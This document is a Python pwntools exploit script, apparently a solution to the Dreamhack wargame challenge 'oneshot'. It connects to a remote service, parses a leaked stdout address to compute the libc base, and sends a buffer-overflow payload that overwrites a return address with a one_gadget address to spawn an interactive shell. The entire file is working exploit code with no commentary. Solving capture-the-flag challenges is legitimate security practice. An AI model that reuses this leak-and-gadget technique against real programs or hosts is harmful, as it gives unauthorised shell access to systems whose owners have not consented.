#!/usr/bin/python3

import pwn

#p = pwn.process("./oneshot")
p = pwn.remote("host1.dreamhack.games", 9900)
pwn.context.log_level = 'debug'

oneGadget = 0x45216
prefix = b"A"*0x18
postfix = b"A"*0x8
stdoutOffset = 0x3c5620

p.recvuntil("stdout: ")
stdoutGot = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)

libcAddr = stdoutGot - stdoutOffset
pwn.log.info("Libc Base Address: " + hex(libcAddr))

pwn.log.info("Gadget Mapping Address: " + hex(oneGadget + libcAddr))
payload = prefix
payload += pwn.p64(0x0)
payload += postfix
payload += pwn.p64(oneGadget + libcAddr)

p.sendafter("MSG: ", payload)
p.interactive()
